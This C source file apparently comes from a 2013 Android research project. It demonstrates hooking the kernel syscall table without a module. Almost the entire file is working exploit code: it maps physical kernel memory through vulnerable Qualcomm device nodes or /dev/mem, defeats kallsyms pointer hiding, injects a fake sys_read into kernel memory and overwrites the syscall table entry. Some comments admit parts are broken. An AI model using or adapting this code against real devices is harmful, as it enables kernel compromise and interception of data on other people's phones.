/*****************************************************************************
 * injectk.c : Demo hooking Linux kernel syscall without LKM.
 *****************************************************************************
 * Copyright (C) 2013 Ming Hu <tewilove@gmail.com>
 * $Id$
 *
 * Authors: Ming Hu <tewilove@gmail.com>
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation; either version 2.1 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston MA 02110-1301, USA.
 *****************************************************************************/

#include <fcntl.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>

#include <android/log.h>

#define TAG "HooK"
#if 0
#define LOGD(fmt, ...) __android_log_print(ANDROID_LOG_DEBUG, TAG, fmt, ##__VA_ARGS__)
#else
#define LOGD(fmt, ...) do { fprintf(stderr, fmt, ##__VA_ARGS__); fflush(stderr); } while (0)
#endif

#define HOOK_CODE 0x4000
#define HOOK_DATA 0x6000

// fix me
#define PAGE_OFFSET 0xc0000000

static void memsave(const char *f, const void *addr, int size) {
    int fd, n, c, rc;
    
    // printf("memsave: file = %s, size = %08x", f, size);
    fd = open(f, O_CREAT | O_WRONLY, 0644);
    if (fd < 0) {
        LOGD("open() failed: %s.", strerror(errno));
        return;
    }
    n = 0;
    while (n < size) {
        c = size - n;
        if (c > 65536) c = 65536;
        rc = write(fd, (char *) addr + n, size - n);
        if (rc <= 0) break;
        n += rc;
        // printf("memsave: write %08x.", rc);
    }
    if (n != size)
        LOGD("write() failed: %s.", strerror(errno));
    close(fd);
}

static int get_kernel_addr(unsigned long *kaddr, unsigned long *ksize) {
	int rc = -1, expect = 0;
	FILE *fp;
	char line[1024], *tmp;
	unsigned long ps, ram_s, ram_e, code_s, code_e, data_s, data_e;

	ps = sysconf(_SC_PAGE_SIZE);
	fp = fopen("/proc/iomem", "r");
	if (!fp)
		return rc;
	while (-1) {
		tmp = fgets(line, sizeof(line), fp);
		if (!tmp)
			break;
		if (strstr(line, "System RAM")) {
			sscanf(line, "%08x-%08x", &ram_s, &ram_e);
			expect = 1;
			continue;
		}
		if (expect == 1) {
			if (strstr(line, "Kernel code") || strstr(line, "Kernel text")) {
				sscanf(line, "%08x-%08x", &code_s, &code_e);
				expect = 2;
				continue;
			}
		}
		if (expect == 2) {
			if (strstr(line, "Kernel data")) {
				sscanf(line, "%08x-%08x", &data_s, &data_e);
				rc = 0;
				break;
			}
		}
	}
	fclose(fp);
	if (!rc) {
		*kaddr = (ram_s & ~(ps - 1));
		*ksize = ((data_e - ram_s) | (ps - 1)) + 1;
	}

	return rc;
}

static int get_kernel_symb(const char *name, unsigned long *out) {
	FILE *fp;
	char line[1024], *tmp, sname[1024], stype;
	unsigned long saddr;
	int rc = -1;

	fp = fopen("/proc/kallsyms", "r");
	if (!fp)
		return rc;
	while (-1) {
		tmp = fgets(line, sizeof(line), fp);
		if (!tmp)
			break;
		rc = sscanf(line, "%08x %c %s", &saddr, &stype, sname);
		if (rc != 3)
			continue;
		if (name == 0 || !strcmp(name, sname)) {
			*out = saddr;
			rc = 0;
			break;
		}
	}
	fclose(fp);
	return rc;
}

static int get_syscall_table_offset(const void *addr, unsigned long size, unsigned long *out) {
	int rc;
	unsigned long refs[4], *tmp;
	
	rc = get_kernel_symb("sys_restart_syscall", &refs[0]);
	rc |= get_kernel_symb("sys_exit", &refs[1]);
	rc |= get_kernel_symb("sys_fork_wrapper", &refs[2]);
	rc |= get_kernel_symb("sys_read", &refs[3]);
	if (rc < 0) {
		return -1;
	}
	tmp = memmem(addr, size, refs, sizeof(refs));
	if (!tmp)
		return -1;
	*out = (unsigned long) tmp - (unsigned long) addr;
	return 0;
}

typedef int (*sys_getuid_t)();
typedef int (*sys_geteuid_t)();
typedef int (*printk_t)(const char *, ...);

typedef size_t (*sys_read_t)(unsigned int, char *, size_t);

struct simple_kernel_hook {
	sys_read_t sys_read;
	sys_getuid_t sys_getuid;
	sys_geteuid_t sys_geteuid;
	printk_t printk;
	char format[32];
};

static int simple_kernel_hook_setup(struct simple_kernel_hook *t) {
	int rc;

	rc = get_kernel_symb("sys_read", (unsigned long *) &t->sys_read);
	rc |= get_kernel_symb("sys_getuid", (unsigned long *) &t->sys_getuid);
	rc |= get_kernel_symb("sys_geteuid", (unsigned long *) &t->sys_geteuid);
	rc |= get_kernel_symb("printk", (unsigned long *) &t->printk);
	if (rc < 0)
		return -1;
	strncpy(t->format, "<%d> sys_read(%d, %p, %x)\n", sizeof(t->format));
	return 0;
}

// fix me
static size_t fake_sys_read(unsigned int fd, char *data, size_t size) {
	struct simple_kernel_hook *t = (struct simple_kernel_hook *)(HOOK_DATA + PAGE_OFFSET);

	if (fd < 3) {	// media_rw
		t->printk(t->format,
			t->sys_getuid(),
			fd,
			data,
			size
		);
	}

	return t->sys_read(fd, data, size);
}

#define MSM_CAM_IOCTL_MAGIC 'm'

struct msm_mem_map_info {
    uint32_t cookie;
    uint32_t length;
    uint32_t mem_type;
};

#define MSM_CAM_IOCTL_SET_MEM_MAP_INFO \
        _IOR(MSM_CAM_IOCTL_MAGIC, 41, struct msm_mem_map_info *)

#define MSM_MEM_MMAP 0

// fix me: this is totally wrong
static int the_mmap_wrapper(long addr, long size, int *fd, void **mapped) {
	int rc, _fd, _fd_cam;
	void *_mapped;

	//LOGD("trying /dev/exynos-mem\n");
	//_fd = open("/dev/exynos-mem", O_RDWR);
	//if (_fd < 0) {
		LOGD("trying /dev/rmt_storage\n");
		_fd = open("/dev/rmt_storage", O_RDWR);
	//}
	if (_fd < 0) {
		LOGD("- %s\n", strerror(errno));
		LOGD("trying /dev/msm-buspm-dev\n");
		_fd = open("/dev/msm-buspm-dev", O_RDWR);
	}
	if (_fd < 0) {
		LOGD("- %s\n", strerror(errno));
		LOGD("trying /dev/msm_camera/config0\n");
		_fd_cam = open("/dev/video0", O_RDWR);
		if (_fd_cam >= 0) {
			_fd = open("/dev/msm_camera/config0", O_RDWR);
			if (_fd < 0) {
				LOGD("- %s\n", strerror(errno));
				close(_fd_cam);
			}
			else {
				struct msm_mem_map_info args;

				args.cookie = addr;
				args.length = size;
				args.mem_type = MSM_MEM_MMAP;
				rc = ioctl(_fd, MSM_CAM_IOCTL_SET_MEM_MAP_INFO, &args);
				if (rc < 0) {
					LOGD("- %s\n", strerror(errno));
					close(_fd);
					_fd = -1;
				}
				close(_fd_cam);
			}
		} else {
			LOGD("- %s\n", strerror(errno));
		} 
	}
	if (_fd < 0) {
		LOGD("trying /dev/mem\n");
		_fd = open("/dev/mem", O_RDWR);
		if (_fd < 0) {
			LOGD("- %s\n", strerror(errno));
			return -1;
		}
	}
	_mapped = mmap((void *) addr, size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED, _fd, 0);
	if (_mapped == MAP_FAILED) {
		LOGD("- %s\n", strerror(errno));
		close(_fd);
		return -1;
	}
	*fd = _fd;
	*mapped = _mapped;
	return 0;
}

int main(int argc, char *argv[]) {
	int rc, fd, i;
	void *mapped, *p;
	unsigned long kaddr, ksize, koffs, test, sys_call_table;
	struct simple_kernel_hook hook;
	unsigned long code_off, data_off, sc_off;

	rc = get_kernel_addr(&kaddr, &ksize);
	if (rc < 0) {
		return 1;
	}
	if (ksize < 0x02000000)
		ksize = 0x01000000;
	LOGD("mmap %x@%x\n", ksize, kaddr);
	rc = the_mmap_wrapper(kaddr, ksize, &fd, &mapped);
	if (rc < 0) {
		return 2;
	}
#if 1
	if (argc > 1) {
		memsave(argv[1], mapped, ksize);
		munmap(mapped, ksize);
		close(fd);
		return -1;
	}
#endif
	// usually 0xc0008000
	rc = get_kernel_symb(0, &test);
	if (rc < 0 || test == 0) {
		LOGD("process kallsyms\n");
		do {
			p = memmem(mapped, ksize, "K %c", 4);
			if (p) {
				*((uint8_t *)((unsigned long) p)) = ' ';
			}
		} while (p);
		// wtf
		msync(mapped, ksize, 0);
		sleep(4);
		//
		rc = get_kernel_symb(0, &test);
	}
	if (rc < 0 || test == 0) {
		munmap(mapped, ksize);
		return 3;
	}
	// usually 0xc0000000
	koffs = test & 0xffff0000;
	LOGD("pa = %x\n", koffs);
	rc = get_kernel_symb("sys_call_table", &sys_call_table);
	if (rc < 0) {
		rc = get_syscall_table_offset(mapped, ksize, &sc_off);
	} else {
		sc_off = sys_call_table - koffs;
		LOGD("sys_call_table = %x\n", sys_call_table);
	}
	if (rc < 0) {
		munmap(mapped, ksize);
		return 4;
	}
	rc = simple_kernel_hook_setup(&hook);
	if (rc < 0) {
		munmap(mapped, ksize);
		return 5;
	}
	LOGD("about to hook\n");
	// copy code and data
	code_off = HOOK_CODE;
	data_off = HOOK_DATA;
	memcpy((char *) mapped + code_off, fake_sys_read, 512);
	memcpy((char *) mapped + data_off, &hook, sizeof(hook));
	msync(mapped, ksize, 0);
	sleep(4);
	LOGD("about to alter code\n");
#if 0
	if (argc > 1) {
		LOGD("dump memory to %s\n", argv[1]);
		memsave(argv[1], mapped, ksize);
		return 0;
	}
#endif
	// scno = 3, sys_read
	LOGD("*%x = %x\n", ((unsigned long *)((unsigned long) mapped + sc_off) + 3), koffs + HOOK_CODE);
	sleep(4); 
	*((unsigned long *)((unsigned long) mapped + sc_off) + 3) = koffs + HOOK_CODE;
	//
	msync(mapped, ksize, 0);
	sleep(4);
	if (argc > 1) {
		LOGD("dump memory to %s\n", argv[1]);
		memsave(argv[1], mapped, ksize);
	}
	munmap(mapped, ksize);
	close(fd);
	return 0;
}

